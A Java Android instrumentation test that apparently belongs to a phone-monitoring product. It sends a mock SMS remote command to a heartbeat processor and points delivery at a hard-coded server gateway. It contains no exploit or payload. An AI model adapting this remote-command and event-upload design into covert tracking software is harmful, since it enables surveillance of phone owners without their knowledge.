package com.vvt.remotecommandmanager;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.test.ActivityInstrumentationTestCase2;

import com.vvt.appcontext.AppContext;
import com.vvt.appcontext.AppContextImpl;
import com.vvt.connectionhistorymanager.ConnectionHistoryManagerImp;
import com.vvt.datadeliverymanager.DataDeliveryManager;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.datadeliverymanager.interfaces.PccRmtCmdListener;
import com.vvt.datadeliverymanager.interfaces.ServerStatusErrorListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManagerImpl;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.CommandServiceManager;
import com.vvt.phoenix.prot.command.response.PCC;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.processor.miscellaneous.RequestHeartbeatProcessor;
import com.vvt.server_address_manager.ServerAddressManager;
import com.vvt.server_address_manager.ServerAddressManagerImpl;

public class RemoteCommandProcessorTestCase extends
		ActivityInstrumentationTestCase2<Remote_command_manager_testsActivity> implements PccRmtCmdListener, ServerStatusErrorListener{

	private static final String TAG = "RemoteCommandProcessorTestCase";

	private DataDeliveryManager mDataDeliveryManager;
	private ServerAddressManager mMockServerAddressManager;
	private Context mTestContext;
	private AppContext mAppContext;
	
	public RemoteCommandProcessorTestCase() {
		super("com.vvt.remotecommandmanager",
				Remote_command_manager_testsActivity.class);
	}

	

	@Override
	protected void setUp() throws Exception {
		super.setUp();
		mTestContext = this.getInstrumentation().getContext();
		
		mAppContext = new AppContextImpl(mTestContext);
		
		mMockServerAddressManager = new ServerAddressManagerImpl(new AppContextMock());
		mMockServerAddressManager.setServerUrl("http://58.137.119.229/RainbowCore");
		
		try {
			mDataDeliveryManager = new DataDeliveryManager();
			mDataDeliveryManager.setAppContext(mAppContext);
			mDataDeliveryManager.setCommandServiceManager(createCommandServiceManager());
			mDataDeliveryManager.setConnectionHistory(new ConnectionHistoryManagerImp(mTestContext.getCacheDir().getAbsolutePath()) {});
			mDataDeliveryManager.setLicenseManager(new LicenseManagerImpl(mTestContext));
			mDataDeliveryManager.setPccRmtCmdListener(this);
			mDataDeliveryManager.setServerAddressManager(mMockServerAddressManager);
			mDataDeliveryManager.setServerStatusErrorListener(this);
			mDataDeliveryManager.initialize();
		} catch (FxNullNotAllowedException e) {}
		
	}
	
	private CommandServiceManager createCommandServiceManager() {
		String dbPath = "/sdcard/";
		String payloadPath = "/sdcard/";
		
		CommandServiceManager manager = CommandServiceManager.getInstance(dbPath, payloadPath);  
		manager.setStructuredUrl("http://58.137.119.229/RainbowCore/gateway");
		manager.setUnStructuredUrl("http://58.137.119.229/RainbowCore/gateway/unstructured");
		return manager;
	}
	
	@Override
	protected void tearDown() throws Exception {
		super.tearDown();
	}

	public void setTestContext(Context context) {
		mTestContext = context;
	}

	public Context getTestContext() {
		return mTestContext;
	}
	
	 
	
	/**
	 * the system should deliver non-demia before media events. 
	 * so the DeliveryListener should got notification, "Onprogress" in RequestEventsProcessor
	 */
//	public void test_requestEventsProcessor() {
//		
//		final int callerId = 1;
//
//		TEST_DataDeliverytMock dataDeliveryMock = new TEST_DataDeliverytMock(
//				DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR);
//		TEST_EventRepositoryMock eventRepositoryMock = new TEST_EventRepositoryMock(
//				DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR);
//		
//		InitializeParameters params = new InitializeParameters();
//		params.setCallerId(callerId);
//		params.setDataDelivery(dataDeliveryMock);
//		params.setEventRepository(eventRepositoryMock);
//
//		
//		LicenseInfo licenseInfo = new LicenseInfo();
//		licenseInfo.setActivationCode("1234567890");
//		
//		
//		try {
//			EventDeliveryManager eventDeliveryManager = new EventDeliveryManager(mAppContext, params);
//			
//			RequestEventsProcessor eventsProcessor = new RequestEventsProcessor(mAppContext,
//					eventRepositoryMock, eventDeliveryManager, licenseInfo);
//
//			ArrayList<String> arg = new ArrayList<String>();
//			arg.add("1234567890");
//			arg.add("D");
//			
//			RemoteCommandData commandData = new RemoteCommandData();
//			commandData.setCommandCode("xx");
//			commandData.setArguments(arg);
//			commandData.setRmtCommandType(RemoteCommandType.SMS_COMMAND);
//			commandData.setSenderNumber("1234567889");
//			commandData.setSmsReplyRequired(true);
//			
//			eventsProcessor.processCommand(commandData);
//			
//			while (!eventsProcessor.isfinish()) {};
//			
//			FxLog.d(TAG,eventsProcessor.getMessage());
//			
//		} catch (FxNullNotAllowedException e) {
//			e.printStackTrace();
//		}
//	}
	
	public void test_requestHeartbeatProcessor() {
		TEST_EventRepositoryMock eventRepositoryMock = new TEST_EventRepositoryMock(
				DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR);
		LicenseInfo licenseInfo = new LicenseInfo();
		licenseInfo.setActivationCode("1234567890");
		
		RequestHeartbeatProcessor heartbeatProcessor = new RequestHeartbeatProcessor(mAppContext,
				mDataDeliveryManager, eventRepositoryMock, licenseInfo);
		
		ArrayList<String> arg = new ArrayList<String>();
		arg.add("1234567890");
		arg.add("D");
		
		RemoteCommandData commandData = new RemoteCommandData();
		commandData.setCommandCode("xx");
		commandData.setArguments(arg);
		commandData.setRmtCommandType(RemoteCommandType.SMS_COMMAND);
		commandData.setSenderNumber("1234567889");
		commandData.setSmsReplyRequired(true);
		
		heartbeatProcessor.processCommand(commandData);
		
		while (!heartbeatProcessor.isfinish()) {};
		
		FxLog.d(TAG,"heartbeatProcessor :"+heartbeatProcessor.getMessage());
	}

	

	@Override
	public void onServerStatusErrorListener(ServerStatusType serverStatusType) {
		// TODO Auto-generated method stub
		
	}



	@Override
	public void onReceivePCC(List<PCC> pcc) {
		// TODO Auto-generated method stub
		
	}

	private class AppContextMock implements AppContext
	{

		@Override
		public ProductInfo getProductInfo() {
			// TODO Auto-generated method stub
			return null;
		}

		@Override
		public PhoneInfo getPhoneInfo() {
			// TODO Auto-generated method stub
			return null;
		}

		@Override
		public Context getApplicationContext() {
			return mTestContext;
		}

		@Override
		public String getWritablePath() {
			return mTestContext.getCacheDir().getAbsolutePath();
		}
		
	}
}
